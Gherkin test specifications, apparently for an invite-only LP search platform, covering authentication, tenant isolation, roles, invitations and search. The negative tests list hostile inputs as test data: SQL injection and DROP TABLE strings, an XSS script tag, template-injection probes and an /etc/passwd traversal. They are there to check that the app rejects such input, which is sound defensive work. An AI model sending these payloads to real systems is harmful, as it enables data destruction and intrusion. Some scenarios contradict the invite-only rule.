# Milestone 1: Auth + Search Tests
## "Search LPs on lpxgp.com"

> **IMPORTANT: Invite-Only Platform**
> LPxGP has NO public registration. All users must be invited.
> - Super Admin invites Company Admins
> - Company Admins invite team members

---

## F-AUTH-01: User Login [P0]

```gherkin
Feature: User Login
  As an invited user
  I want to login securely
  So that I can access the platform

  # Sub-feature: Login
  Scenario: Login with valid credentials
    Given I have a verified account
    When I enter my email and password
    And I click "Login"
    Then I am logged in
    And I see my dashboard

  Scenario: Login with wrong password
    Given I have a verified account
    When I enter correct email but wrong password
    Then I see "Invalid email or password"
    And I am not logged in

  Scenario: Login with unverified email
    Given I registered but didn't verify email
    When I try to login
    Then I see "Please verify your email first"
    And I can resend verification email

  # --- NEGATIVE TESTS: Login ---
  Scenario: Login with empty email
    Given I am on the login page
    When I leave email field empty
    And I enter password "SomePassword123"
    And I click "Login"
    Then I see "Email is required"

  Scenario: Login with empty password
    Given I am on the login page
    When I enter email "gp@venture.com"
    And I leave password field empty
    And I click "Login"
    Then I see "Password is required"

  Scenario: Login with both fields empty
    Given I am on the login page
    When I click "Login" without filling any fields
    Then I see validation errors for required fields

  Scenario: Login with non-existent email
    When I login with email "nonexistent@venture.com"
    Then I see "Invalid email or password"
    And the error message does not reveal whether email exists

  Scenario: Brute force protection - account lockout
    Given I have a verified account "gp@venture.com"
    When I enter wrong password 5 times consecutively
    Then my account is temporarily locked
    And I see "Too many failed attempts. Account locked for 15 minutes"

  Scenario: Login during account lockout
    Given my account is locked due to failed attempts
    When I try to login with correct credentials
    Then I see "Account locked. Try again in X minutes"
    And I cannot login even with correct password

  Scenario: Login after lockout expires
    Given my account was locked 15 minutes ago
    When I login with correct credentials
    Then I am logged in successfully
    And the lockout counter is reset

  Scenario: Progressive lockout duration
    Given I triggered account lockout 3 times today
    When I trigger lockout again
    Then the lockout duration increases (30 minutes)
    And I see appropriate message

  Scenario: Login with SQL injection attempt
    When I enter email "' OR '1'='1"
    And I enter password "' OR '1'='1"
    And I click "Login"
    Then I see "Invalid email or password"
    And no unauthorized access occurs
    And the attempt is logged for security review

  Scenario: Login from multiple devices simultaneously
    Given I am logged in on Device A
    When I login on Device B
    Then I am logged in on both devices
    And both sessions are valid

  Scenario: Login with inactive/deactivated account
    Given my account has been deactivated by admin
    When I try to login
    Then I see "Account deactivated. Contact support"
    And I cannot access the platform

  # Sub-feature: Password Reset
  Scenario: Request password reset
    Given I have a registered account
    When I click "Forgot password"
    And I enter my email
    And I click "Send reset link"
    Then I receive a password reset email

  Scenario: Reset password
    Given I received a password reset email
    When I click the reset link
    And I enter a new password "NewSecure456!"
    And I confirm the password
    Then my password is updated
    And I can login with the new password

  # --- NEGATIVE TESTS: Password Reset ---
  Scenario: Request reset for non-existent email
    When I request password reset for "nonexistent@venture.com"
    Then I see "If this email exists, you'll receive a reset link"
    And no error reveals whether email exists

  Scenario: Password reset link expired
    Given I received a reset link 2 hours ago
    When I click the expired reset link
    Then I see "Reset link expired, request a new one"

  Scenario: Password reset with mismatched confirmation
    Given I am on the password reset form
    When I enter new password "NewSecure456!"
    And I enter confirmation "DifferentPass789!"
    And I click "Reset Password"
    Then I see "Passwords do not match"

  Scenario: Password reset with weak new password
    Given I am on the password reset form
    When I enter new password "weak"
    And I confirm the password "weak"
    And I click "Reset Password"
    Then I see password strength requirements

  Scenario: Password reset link already used
    Given I successfully reset my password
    When I click the same reset link again
    Then I see "Reset link already used"

  Scenario: Password reset with tampered token
    When I visit reset link with modified token
    Then I see "Invalid reset link"

  Scenario: Password reset rate limiting
    Given I requested 5 password resets in the last hour
    When I request another reset
    Then I see "Too many requests, please wait"
    And no email is sent

  Scenario: Reset password to same as current
    Given I am on the password reset form
    When I enter the same password I currently have
    And I confirm the password
    And I click "Reset Password"
    Then I see "New password must be different from current"

  # Sub-feature: Session Management
  Scenario: Session persists on refresh
    Given I am logged in
    When I refresh the page
    Then I am still logged in

  Scenario: Session expires after inactivity
    Given I am logged in
    When I am inactive for the session timeout period
    And I try to access a protected page
    Then I am redirected to login
    And I see "Session expired, please login again"

  Scenario: Logout
    Given I am logged in
    When I click "Logout"
    Then my session is ended
    And I am redirected to the login page
    And I cannot access protected pages

  # --- NEGATIVE TESTS: Session Management ---
  Scenario: Access protected page without authentication
    Given I am not logged in
    When I try to access "/dashboard"
    Then I am redirected to login
    And I see "Please login to continue"

  Scenario: Access protected page with invalid session token
    Given I have a manipulated session cookie
    When I try to access a protected page
    Then I am redirected to login
    And my invalid session is cleared

  Scenario: Session invalidation after password change
    Given I am logged in on Device A
    When I change my password on Device B
    Then my session on Device A is invalidated
    And I must login again on Device A

  Scenario: Concurrent session limit
    Given I am logged in on 5 devices
    When I login on a 6th device
    Then the oldest session is invalidated
    And I see notification about session limit

  Scenario: Session token in URL is rejected
    When I try to access protected page with token in URL query string
    Then the token is not accepted
    And I am redirected to login

  Scenario: Session fixation prevention
    Given I have a session cookie before login
    When I successfully login
    Then a new session ID is generated
    And the old session ID is invalidated

  Scenario: Logout invalidates session completely
    Given I am logged in and copied my session cookie
    When I logout
    And I restore the old session cookie
    Then I am not authenticated
    And I am redirected to login
```

---

## F-AUTH-02: Multi-tenancy [P0]

```gherkin
Feature: Multi-tenancy
  As a platform
  I want to isolate company data
  So that each company only sees their own data

  # Sub-feature: Company Isolation
  Scenario: User belongs to one company
    Given I am "jane@acme.com" from "Acme Capital"
    Then my company_id is "Acme Capital"
    And I can only access Acme Capital's data

  Scenario: Cannot see other company's funds
    Given I am from "Acme Capital"
    And "Other Firm" has created a fund
    When I view the funds list
    Then I only see Acme Capital's funds
    And I do not see Other Firm's funds

  Scenario: Cannot access other company's fund by URL
    Given I am from "Acme Capital"
    And I know the URL of Other Firm's fund
    When I try to access that URL directly
    Then I see a 404 error
    And I do not see any fund data

  # Sub-feature: Shared Data
  Scenario: LPs are visible to all authenticated users
    Given I am logged in from any company
    When I search for LPs
    Then I see LPs from the global database
    And all companies share the same LP data

  # Sub-feature: Company-Specific Data
  Scenario: Matches are company-specific
    Given I am from "Acme Capital"
    When I generate matches for my fund
    Then those matches belong to Acme Capital
    And other companies cannot see them

  Scenario: Pitches are company-specific
    Given I am from "Acme Capital"
    When I generate a pitch for a match
    Then that pitch belongs to Acme Capital
    And other companies cannot see it

  # --- NEGATIVE TESTS: Multi-tenancy & Authorization ---
  Scenario: Direct API access to other company's fund
    Given I am authenticated as user from "Acme Capital"
    And "Other Firm" has fund with ID "fund-123"
    When I make API request to "/api/funds/fund-123"
    Then I receive 404 Not Found
    And no fund data is leaked in response

  Scenario: Enumerate other company's funds via API
    Given I am authenticated as user from "Acme Capital"
    When I iterate through fund IDs 1 to 1000 via API
    Then I only receive data for Acme Capital funds
    And other company funds return 404

  Scenario: IDOR attack on match data
    Given I am from "Acme Capital"
    And "Other Firm" has match with ID "match-456"
    When I try to access "/matches/match-456"
    Then I see 404 error
    And no match data is exposed

  Scenario: IDOR attack on pitch data
    Given I am from "Acme Capital"
    And "Other Firm" has pitch with ID "pitch-789"
    When I try to access "/pitches/pitch-789"
    Then I see 404 error
    And no pitch data is exposed

  Scenario: Modify other company's fund via API
    Given I am from "Acme Capital"
    When I send PUT request to "/api/funds/other-firm-fund-id"
    Then I receive 404 error
    And the fund is not modified

  Scenario: Delete other company's fund via API
    Given I am from "Acme Capital"
    When I send DELETE request to "/api/funds/other-firm-fund-id"
    Then I receive 404 error
    And the fund is not deleted

  Scenario: Create fund for other company via API manipulation
    Given I am from "Acme Capital"
    When I POST to "/api/funds" with company_id of "Other Firm"
    Then the request is rejected
    And the fund is created for Acme Capital or rejected entirely

  Scenario: Access company settings of other company
    Given I am admin of "Acme Capital"
    When I try to access "/companies/other-firm-id/settings"
    Then I see 404 error
    And no settings are exposed

  Scenario: User switching companies maliciously
    Given I was removed from "Acme Capital"
    And I have old API tokens
    When I try to access Acme Capital data
    Then I receive 401 Unauthorized
    And no data is exposed

  Scenario: RLS bypass attempt via SQL injection
    Given I am authenticated from "Acme Capital"
    When I send malicious company_id parameter "1; DROP TABLE funds;--"
    Then the request is rejected or sanitized
    And database integrity is maintained
```

---

## F-AUTH-03: Role-Based Access Control [P0]

```gherkin
Feature: Role-Based Access Control
  As a company
  I want different permission levels
  So that users have appropriate access

  # Sub-feature: Admin Role
  Scenario: Admin can manage users
    Given I have the Admin role
    When I go to Settings > Users
    Then I can invite new users
    And I can change user roles
    And I can deactivate users

  Scenario: Admin can manage all funds
    Given I have the Admin role
    Then I can create new funds
    And I can edit any fund in my company
    And I can delete any fund in my company

  # Sub-feature: Member Role
  Scenario: Member can create funds
    Given I have the Member role
    Then I can create new funds
    And I own the funds I create

  Scenario: Member can edit own funds
    Given I have the Member role
    And I created "Growth Fund III"
    Then I can edit "Growth Fund III"
    But I cannot edit funds created by others

  Scenario: Member cannot manage users
    Given I have the Member role
    When I go to Settings
    Then I do not see "Users" option
    And I cannot invite or manage users

  # Sub-feature: Viewer Role
  Scenario: Viewer has read-only access
    Given I have the Viewer role
    Then I can view all company funds
    And I can view all matches
    But I cannot create or edit anything

  Scenario: Viewer cannot see edit buttons
    Given I have the Viewer role
    When I view a fund
    Then I do not see "Edit" button
    And I do not see "Delete" button
    And I do not see "Generate Matches" button

  # --- NEGATIVE TESTS: Role-Based Access Control ---
  Scenario: Viewer tries to create fund via API
    Given I have the Viewer role
    When I POST to "/api/funds" with fund data
    Then I receive 403 Forbidden
    And no fund is created

  Scenario: Viewer tries to edit fund via API
    Given I have the Viewer role
    When I PUT to "/api/funds/fund-123"
    Then I receive 403 Forbidden
    And the fund is not modified

  Scenario: Viewer tries to delete fund via API
    Given I have the Viewer role
    When I DELETE to "/api/funds/fund-123"
    Then I receive 403 Forbidden
    And the fund is not deleted

  Scenario: Viewer tries to access user management via URL
    Given I have the Viewer role
    When I navigate directly to "/settings/users"
    Then I see 403 Forbidden or redirect to dashboard
    And I cannot view user list

  Scenario: Member tries to edit another member's fund via API
    Given I have the Member role
    And another member created "Tech Fund IV"
    When I PUT to "/api/funds/tech-fund-iv-id"
    Then I receive 403 Forbidden
    And the fund is not modified

  Scenario: Member tries to delete another member's fund
    Given I have the Member role
    And another member created "Tech Fund IV"
    When I DELETE to "/api/funds/tech-fund-iv-id"
    Then I receive 403 Forbidden
    And the fund is not deleted

  Scenario: Member tries to invite users via API
    Given I have the Member role
    When I POST to "/api/users/invite"
    Then I receive 403 Forbidden
    And no invitation is sent

  Scenario: Member tries to change user roles via API
    Given I have the Member role
    When I PUT to "/api/users/user-123/role"
    Then I receive 403 Forbidden
    And the role is not changed

  Scenario: Member tries to deactivate users via API
    Given I have the Member role
    When I POST to "/api/users/user-123/deactivate"
    Then I receive 403 Forbidden
    And the user is not deactivated

  Scenario: Role escalation attempt via API
    Given I have the Member role
    When I PUT to "/api/users/me" with role "admin"
    Then I receive 403 Forbidden
    And my role remains Member

  Scenario: Admin cannot access other company's user management
    Given I am Admin of "Acme Capital"
    When I try to access "/companies/other-firm/settings/users"
    Then I see 404 error
    And I cannot manage other company's users

  Scenario: Deactivated user cannot access platform
    Given my user account has been deactivated
    When I try to access any page
    Then I am logged out
    And I see "Your account has been deactivated"

  Scenario: Role change takes effect immediately
    Given I am logged in as Admin
    When another Admin changes my role to Viewer
    And I try to create a fund
    Then I receive 403 Forbidden
    And my session reflects the new role
```

---

## F-AUTH-05: User Invitations [P0]

```gherkin
Feature: User Invitations
  As an admin
  I want to invite users to the platform
  So that vetted users can access LPxGP

  # Sub-feature: No Public Registration
  Scenario: No registration page exists
    When I navigate to "/register"
    Then I see 404 error
    And I am not shown a registration form

  Scenario: Login page has no register link
    When I am on the login page
    Then I do not see "Register" or "Sign up" links
    And I only see login form and "Forgot password"

  # Sub-feature: Company Admin Invites Team
  Scenario: Admin invites team member
    Given I am Admin of "Acme Capital"
    When I go to Settings > Team
    And I click "Invite"
    And I enter email "newuser@acme.com"
    And I select role "Member"
    And I click "Send Invitation"
    Then invitation is created
    And email is sent to "newuser@acme.com"
    And I see pending invitation in the list

  Scenario: View pending invitations
    Given I am Admin of "Acme Capital"
    And I invited "user1@acme.com" and "user2@acme.com"
    When I go to Settings > Team
    Then I see:
      | Email | Role | Status | Invited |
      | user1@acme.com | Member | Pending | Today |
      | user2@acme.com | Admin | Pending | Yesterday |

  Scenario: Resend expired invitation
    Given I invited "user@acme.com" 8 days ago
    And the invitation is expired
    When I click "Resend" next to the invitation
    Then a new invitation is created
    And new email is sent
    And the old invitation is cancelled

  Scenario: Cancel pending invitation
    Given I have a pending invitation for "user@acme.com"
    When I click "Cancel" next to the invitation
    Then the invitation is cancelled
    And the user cannot use the invitation link

  # Sub-feature: Accept Invitation
  Scenario: Accept invitation successfully
    Given I received an invitation to join "Acme Capital"
    When I click the invitation link
    Then I see "Welcome to LPxGP"
    And I see "You've been invited to join Acme Capital as Member"
    And I see my email pre-filled (not editable)
    And I see fields for: Full Name, Password, Confirm Password

  Scenario: Complete invitation acceptance
    Given I am on the invitation acceptance page
    When I enter my full name "Jane Smith"
    And I enter password "SecurePass123!"
    And I confirm password "SecurePass123!"
    And I click "Complete Setup"
    Then my account is created
    And I am logged in
    And I see the first-time welcome screen
    And I belong to "Acme Capital" with role "Member"

  Scenario: First-time welcome for Company Admin
    Given I accepted invitation as Admin of "Acme Capital"
    And this is my first login
    When I complete the setup
    Then I see "Welcome to LPxGP!"
    And I see "You're the admin of Acme Capital"
    And I see two options:
      | "Create Your First Fund" (primary) |
      | "Invite Team Members" (secondary) |

  Scenario: First-time welcome for Team Member
    Given I accepted invitation as Member of "Acme Capital"
    And the company has existing funds
    When I complete the setup
    Then I see the dashboard
    And I see the company's funds
    And I see "Welcome! You've joined Acme Capital"

  # Sub-feature: Invitation Validation
  Scenario: Expired invitation link
    Given my invitation was sent 8 days ago
    When I click the invitation link
    Then I see "This invitation has expired"
    And I see "Please contact your administrator for a new invitation"
    And I cannot create an account

  Scenario: Already used invitation link
    Given I already accepted my invitation
    When I click the invitation link again
    Then I see "This invitation has already been used"
    And I see a link to login

  Scenario: Invalid invitation token
    When I navigate to "/invite/invalid-token-xyz"
    Then I see "Invalid invitation link"
    And I cannot create an account

  Scenario: Tampered invitation token
    Given I have a valid invitation link
    When I modify the token in the URL
    Then I see "Invalid invitation link"

  # --- NEGATIVE TESTS: Invitation Errors ---
  Scenario: Invite email that already has account
    Given "existing@acme.com" is already a registered user
    When I try to invite "existing@acme.com"
    Then I see "This user already has an account"
    And no invitation is sent

  Scenario: Invite with invalid email format
    Given I am Admin of "Acme Capital"
    When I try to invite "not-an-email"
    Then I see "Please enter a valid email"
    And no invitation is sent

  Scenario: Invite with empty email
    Given I am Admin of "Acme Capital"
    When I try to invite with empty email
    Then I see "Email is required"
    And no invitation is sent

  Scenario: Invite to same email twice
    Given I already invited "user@acme.com" (pending)
    When I try to invite "user@acme.com" again
    Then I see "An invitation is already pending for this email"
    And I see option to resend or cancel existing

  Scenario: Member cannot send invitations
    Given I have Member role
    When I try to access invitation functionality
    Then I do not see "Invite" button
    And API call to invite returns 403 Forbidden

  Scenario: Viewer cannot send invitations
    Given I have Viewer role
    When I try to access invitation functionality
    Then I do not see "Invite" button
    And API call to invite returns 403 Forbidden

  Scenario: Accept with mismatched passwords
    Given I am on the invitation acceptance page
    When I enter password "SecurePass123!"
    And I confirm password "DifferentPass456!"
    And I click "Complete Setup"
    Then I see "Passwords do not match"
    And account is not created

  Scenario: Accept with weak password
    Given I am on the invitation acceptance page
    When I enter password "weak"
    Then I see password strength error
    And account is not created

  Scenario: Accept with empty name
    Given I am on the invitation acceptance page
    When I leave name field empty
    And I enter valid password
    And I click "Complete Setup"
    Then I see "Name is required"
    And account is not created

  Scenario: Accept with XSS in name field
    Given I am on the invitation acceptance page
    When I enter name "<script>alert('xss')</script>"
    Then the name is sanitized
    And no script is executed

  Scenario: Rate limit invitation creation
    Given I created 20 invitations in the last hour
    When I try to create another invitation
    Then I see "Too many invitations sent. Please wait."
    And no invitation is sent

  Scenario: Rate limit invitation acceptance attempts
    Given I failed to accept invitation 5 times
    When I try again
    Then I see "Too many attempts. Please wait 15 minutes."

  Scenario: Invitation for deactivated company
    Given "Defunct Corp" company has been deactivated
    When I click an old invitation link for Defunct Corp
    Then I see "This company is no longer active"
    And I cannot create an account
```

---

## F-LP-02: LP Search & Filter [P0]

```gherkin
Feature: LP Search & Filter
  As a GP
  I want to search and filter LPs
  So that I can find relevant investors

  # Sub-feature: Type Filter
  Scenario: Filter by single LP type
    Given the database has LPs of various types
    When I filter by type "Public Pension"
    Then I only see Public Pension LPs
    And result count is updated

  Scenario: Filter by multiple LP types
    Given the database has LPs of various types
    When I filter by types "Public Pension" and "Endowment"
    Then I see LPs that are either type
    And result count shows combined total

  # Sub-feature: Strategy Filter
  Scenario: Filter by strategy
    Given the database has LPs with various strategies
    When I filter by strategy "Private Equity"
    Then I only see LPs that invest in PE
    And LPs with only "Venture Capital" are excluded

  Scenario: Filter by multiple strategies
    When I filter by "Private Equity" and "Real Estate"
    Then I see LPs that invest in either strategy

  # Sub-feature: Geography Filter
  Scenario: Filter by geography
    Given LPs have geographic preferences
    When I filter by geography "North America"
    Then I see LPs that invest in North America
    And LPs focused only on Europe are excluded

  # Sub-feature: Check Size Filter
  Scenario: Filter by check size range
    When I filter by check size $20M - $80M
    Then I see LPs whose check size range overlaps
    And LPs with range $100M-$500M are excluded
    And LPs with range $10M-$50M are included (overlaps)

  # Sub-feature: Full-Text Search
  Scenario: Search by LP name
    When I search for "CalPERS"
    Then I see LPs with "CalPERS" in the name
    And results are ranked by relevance

  Scenario: Search by mandate text
    When I search for "climate technology"
    Then I see LPs with those terms in mandate
    And results include partial matches

  Scenario: Combine search with filters
    When I search for "technology"
    And I filter by type "Endowment"
    Then I only see Endowments
    And they contain "technology" in searchable fields

  # Sub-feature: Saved Searches
  Scenario: Save search as preset
    Given I applied filters (type, strategy, geography)
    When I click "Save Search"
    And I name it "My Target LPs"
    Then the search preset is saved
    And I can load it later with one click

  # Sub-feature: Export
  Scenario: Export search results
    Given I have search results (50 LPs)
    When I click "Export CSV"
    Then a CSV file downloads
    And it contains all visible LP data

  # Sub-feature: Pagination
  Scenario: Paginate results
    Given there are 150 matching LPs
    When I view results
    Then I see 50 LPs per page
    And I can navigate to page 2 and 3

  # Sub-feature: Performance
  Scenario: Search performance
    Given there are 10,000 LPs in the database
    When I perform a search with filters
    Then results load in under 500ms

  # --- NEGATIVE TESTS: Search Edge Cases ---
  Scenario: Search returns no results
    When I search for "XyzNonExistentLP123"
    Then I see "No LPs found matching your criteria"
    And I see suggestions to broaden search
    And I do not see an error

  Scenario: Search with empty query
    When I submit search with empty query
    Then I see all LPs (unfiltered results)
    Or I see "Please enter a search term"

  Scenario: Search with only whitespace
    When I search for "     "
    Then the whitespace is trimmed
    And I see all LPs or prompt for valid query

  Scenario: Filter combination returns no results
    When I filter by type "Family Office"
    And I filter by strategy "Infrastructure"
    And I filter by geography "Antarctica"
    Then I see "No LPs match these filters"
    And I see option to clear filters

  # --- NEGATIVE TESTS: Special Characters in Search ---
  Scenario: Search with special characters
    When I search for "O'Brien & Partners"
    Then results include LPs with apostrophes and ampersands
    And no SQL error occurs

  Scenario: Search with quotes
    When I search for '"exact phrase match"'
    Then results match the exact phrase
    And no errors occur

  Scenario: Search with unicode characters
    When I search for "Munich Re"
    Then results include LPs with unicode characters
    And results are properly displayed

  Scenario: Search with emoji
    When I search for "Tech Ventures"
    Then the search handles emoji gracefully
    And returns relevant results or empty set

  Scenario Outline: Search with potentially dangerous characters
    When I search for "<dangerous_input>"
    Then the input is sanitized
    And no injection occurs
    And I see safe results or no results

    Examples:
      | dangerous_input                        |
      | '; DROP TABLE lps; --                  |
      | <script>alert('xss')</script>          |
      | ' OR '1'='1                            |
      | ${7*7}                                 |
      | {{constructor.constructor('alert')()}} |
      | ../../../etc/passwd                    |
      | %00null%00byte                         |

  # --- NEGATIVE TESTS: SQL Injection Prevention ---
  Scenario: SQL injection in search field
    When I search for "'; SELECT * FROM users; --"
    Then I see no results or safe error message
    And no database query is executed maliciously
    And the attempt is logged

  Scenario: SQL injection in filter parameters
    When I send filter parameter type="Public Pension'; DROP TABLE lps;--"
    Then the parameter is sanitized
    And normal filter behavior occurs
    And database is not affected

  Scenario: SQL injection in pagination parameters
    When I send page parameter "1; DELETE FROM lps;"
    Then the parameter is validated as integer
    And invalid input is rejected
    And default pagination is used

  Scenario: SQL injection in sort parameter
    When I send sort parameter "name; DROP TABLE lps;--"
    Then the parameter is validated against whitelist
    And invalid sort is rejected
    And default sorting is used

  # --- NEGATIVE TESTS: Invalid Input Handling ---
  Scenario: Negative page number in pagination
    When I request page "-1"
    Then I see page 1 results
    Or I see validation error

  Scenario: Extremely large page number
    When I request page "999999999"
    Then I see "No more results" or last valid page
    And server handles gracefully without timeout

  Scenario: Non-numeric page parameter
    When I request page "abc"
    Then I see page 1 results
    Or I see validation error

  Scenario: Check size filter with negative values
    When I filter by check size $-10M - $50M
    Then I see validation error
    Or negative value is treated as 0

  Scenario: Check size filter with min greater than max
    When I filter by check size $100M - $10M
    Then I see validation error
    Or values are swapped automatically

  Scenario: Check size filter with non-numeric values
    When I filter by check size "abc" - "xyz"
    Then I see validation error
    And default range is used

  Scenario: Extremely long search query
    When I search with a query of 10,000 characters
    Then the query is truncated or rejected
    And server responds without crashing
    And appropriate error message is shown

  # --- NEGATIVE TESTS: Saved Searches ---
  Scenario: Save search with empty name
    Given I applied filters
    When I click "Save Search"
    And I leave name empty
    And I click "Save"
    Then I see "Search name is required"

  Scenario: Save search with duplicate name
    Given I have saved search "My Target LPs"
    When I try to save another search with same name
    Then I see "A search with this name already exists"
    And I can choose to overwrite or rename

  Scenario: Save search with very long name
    When I try to save search with 500 character name
    Then I see "Search name too long"
    And the save is rejected

  Scenario: Delete non-existent saved search
    When I try to delete saved search that was already deleted
    Then I see appropriate message
    And no error occurs

  Scenario: Load saved search with outdated filters
    Given I saved a search with filter "LP Type: Legacy Category"
    And "Legacy Category" LP type no longer exists
    When I load the saved search
    Then outdated filters are ignored
    And I see notification about invalid filters

  # --- NEGATIVE TESTS: Export ---
  Scenario: Export with no results
    Given I have search results with 0 LPs
    When I click "Export CSV"
    Then I see "No data to export"
    Or I receive CSV with only headers

  Scenario: Export very large result set
    Given I have search results with 50,000 LPs
    When I click "Export CSV"
    Then export starts processing
    And I see progress indicator
    And file is delivered (possibly async)

  Scenario: Export while not authenticated
    Given my session expired
    When I click "Export CSV"
    Then I am redirected to login
    And no export occurs

  # --- NEGATIVE TESTS: Performance & Rate Limiting ---
  Scenario: Rapid repeated searches (rate limiting)
    When I perform 100 searches in 10 seconds
    Then I am rate limited
    And I see "Too many requests, please slow down"

  Scenario: Complex filter timeout prevention
    When I apply all possible filters simultaneously
    Then search completes within reasonable time
    Or I see "Search too complex, please simplify"

  Scenario: Concurrent search requests
    When I open 10 browser tabs and search simultaneously
    Then all searches complete
    And server remains responsive
```

---

## F-UI-01: Dashboard [P0]

```gherkin
Feature: Dashboard
  As a GP
  I want a dashboard overview
  So that I can see my key information at a glance

  # Sub-feature: Fund Summary
  Scenario: See fund status summary
    Given I have 3 funds (1 draft, 2 active)
    When I view the dashboard
    Then I see "3 Funds"
    And I see "1 Draft, 2 Active"

  # Sub-feature: LP Database Stats
  Scenario: See LP count
    Given there are 500 LPs in the database
    When I view the dashboard
    Then I see "500 LPs available"

  # Sub-feature: Quick Actions
  Scenario: Quick action buttons
    When I view the dashboard
    Then I see "Create Fund" button
    And I see "Search LPs" button

  Scenario: Create fund from dashboard
    When I click "Create Fund" on dashboard
    Then I go to the fund creation page

  # Sub-feature: Recent Activity
  Scenario: See recent activity
    Given I searched LPs yesterday
    And I created a fund today
    When I view the dashboard
    Then I see recent activity log
    And most recent actions are at top

  # --- NEGATIVE TESTS: Dashboard ---
  Scenario: Dashboard with no funds
    Given I have 0 funds
    When I view the dashboard
    Then I see "0 Funds"
    And I see "Create your first fund" prompt

  Scenario: Dashboard with no activity
    Given I just registered and have no activity
    When I view the dashboard
    Then I see empty activity section
    And I see helpful onboarding tips

  Scenario: Dashboard data loading error
    Given the database is temporarily unavailable
    When I view the dashboard
    Then I see graceful error message
    And I see "Retry" button
    And page does not crash

  Scenario: Dashboard for Viewer role
    Given I have the Viewer role
    When I view the dashboard
    Then I do not see "Create Fund" button
    And I see view-only indicators

  Scenario: Dashboard access without authentication
    Given I am not logged in
    When I navigate to "/dashboard"
    Then I am redirected to login page
```

---

## F-UI-03: LP Search Interface [P0]

```gherkin
Feature: LP Search Interface
  As a GP
  I want a powerful search interface
  So that I can easily find LPs

  # Sub-feature: Filter Sidebar
  Scenario: Collapsible filter sidebar
    When I go to LP Search
    Then I see a filter sidebar on the left
    And I can collapse it for more space
    And I can expand it to see all filters

  Scenario: Filter options
    When I view the filter sidebar
    Then I see filter groups:
      | Filter Group | Options |
      | LP Type | Public Pension, Endowment, Family Office, etc. |
      | Strategy | Private Equity, Venture Capital, Real Estate, etc. |
      | Geography | North America, Europe, Asia, etc. |
      | Check Size | Min/Max sliders |

  # Sub-feature: Results Display
  Scenario: LP cards view
    When I view search results
    Then I see LPs displayed as cards
    And each card shows:
      | Name | CalPERS |
      | Type | Public Pension |
      | AUM | $450B |
      | Strategies | PE, VC |
      | Check Size | $10M - $100M |

  Scenario: Quick view modal
    When I click on an LP card
    Then a modal opens with more details
    And I see contacts, mandate, history
    And I can close the modal

  # Sub-feature: Bulk Actions
  Scenario: Select multiple LPs
    When I check boxes on multiple LP cards
    Then I see "3 selected" indicator
    And I see bulk action buttons

  Scenario: Add selected to shortlist
    Given I selected 5 LPs
    When I click "Add to Shortlist"
    Then those LPs are added to my shortlist
    And I see confirmation message

  Scenario: Export selected LPs
    Given I selected 5 LPs
    When I click "Export"
    Then a CSV with those 5 LPs downloads

  # Sub-feature: Sorting
  Scenario: Sort results
    When I view search results
    Then I can sort by:
      | Sort Option |
      | Relevance (default) |
      | Name A-Z |
      | AUM (highest first) |
      | AUM (lowest first) |

  # Sub-feature: HTMX Updates
  Scenario: Filters update without page reload
    When I check a filter option
    Then results update via HTMX
    And the page does not fully reload
    And URL updates with filter params

  # --- NEGATIVE TESTS: UI Edge Cases ---
  Scenario: Search interface without JavaScript
    Given JavaScript is disabled in browser
    When I go to LP Search
    Then the page still loads
    And basic functionality works (with page reloads)
    And I see message about enhanced experience with JS

  Scenario: Mobile responsive view
    Given I am on a mobile device (< 768px width)
    When I go to LP Search
    Then filters are hidden by default
    And I can toggle filter visibility
    And cards are displayed in single column

  Scenario: LP card with missing data
    Given an LP has no AUM data
    When I view the LP card
    Then I see "N/A" or "-" for missing fields
    And the card layout is not broken

  Scenario: Quick view modal for LP with minimal data
    Given an LP has only name and type
    When I click on the LP card
    Then modal opens with available data
    And missing sections show "No data available"

  Scenario: Modal close on escape key
    Given the LP modal is open
    When I press Escape key
    Then the modal closes
    And focus returns to the LP card

  Scenario: Modal close on backdrop click
    Given the LP modal is open
    When I click outside the modal
    Then the modal closes

  # --- NEGATIVE TESTS: Bulk Actions ---
  Scenario: Bulk action with nothing selected
    Given I have not selected any LPs
    When I click "Add to Shortlist"
    Then I see "Please select at least one LP"
    And no action is performed

  Scenario: Select all across multiple pages
    Given there are 150 LPs matching my filters
    When I click "Select All"
    Then I see option to "Select all 150 matching LPs"
    Or only current page is selected

  Scenario: Deselect all
    Given I have selected 5 LPs
    When I click "Deselect All"
    Then all selections are cleared
    And selection counter shows "0 selected"

  Scenario: Bulk action during loading state
    Given I selected 5 LPs
    And I clicked "Add to Shortlist"
    And the action is processing
    When I try to click "Add to Shortlist" again
    Then the button is disabled
    And duplicate action is prevented

  Scenario: Bulk export exceeds limit
    Given I selected 1000 LPs
    When I click "Export"
    Then I see "Export limited to 500 LPs"
    Or export proceeds with warning

  # --- NEGATIVE TESTS: Sorting ---
  Scenario: Sort with invalid parameter via URL
    When I navigate to "/search?sort=malicious_column"
    Then default sorting is applied
    And no error is shown to user
    And the attempt is logged

  Scenario: Sort stability across pages
    Given I sorted by "Name A-Z"
    When I navigate to page 2
    Then results are still sorted by Name
    And sorting preference persists

  # --- NEGATIVE TESTS: HTMX Updates ---
  Scenario: HTMX request fails due to network error
    Given I have unstable network connection
    When I check a filter option
    And the HTMX request fails
    Then I see error notification
    And I can retry the action
    And the filter state is not corrupted

  Scenario: HTMX request timeout
    Given the server is slow
    When I check a filter option
    And the request takes more than 10 seconds
    Then I see loading indicator
    And eventually timeout message
    And I can retry

  Scenario: Rapid filter changes
    When I quickly check and uncheck multiple filters
    Then only the final state is applied
    And I do not see flickering results

  Scenario: URL state out of sync
    Given I applied filters via UI
    When I modify URL parameters manually
    And I refresh the page
    Then UI reflects the URL parameters
    And results match the URL state

  Scenario: Browser back button after filtering
    Given I applied filter "Public Pension"
    And I applied filter "Endowment"
    When I press browser back button
    Then previous filter state is restored
    And results update accordingly
```

---

## E2E: First Login to LP Search

```gherkin
Feature: New User First Login Journey
  As a newly registered GP
  I want to search for LPs
  So that I can explore potential investors

  Scenario: Register, verify, and search
    # Registration
    Given I am on the homepage
    When I click "Get Started"
    And I enter my details and register
    Then I receive a verification email

    # Verification
    When I click the verification link
    Then I see "Email verified"
    And I am redirected to login

    # Login
    When I login with my credentials
    Then I see the dashboard
    And I see "Welcome! Create your first fund or explore LPs"

    # Search LPs
    When I click "Search LPs"
    Then I see the LP search interface
    And I see all available LPs

    # Apply filters
    When I filter by type "Endowment"
    And I filter by strategy "Venture Capital"
    Then I see filtered results
    And all results are Endowments investing in VC

    # View LP details
    When I click on "Harvard Endowment"
    Then I see full LP profile
    And I see their investment mandate
    And I see their contact information

    # Save search
    When I click "Save Search"
    And I name it "VC Endowments"
    Then the search is saved
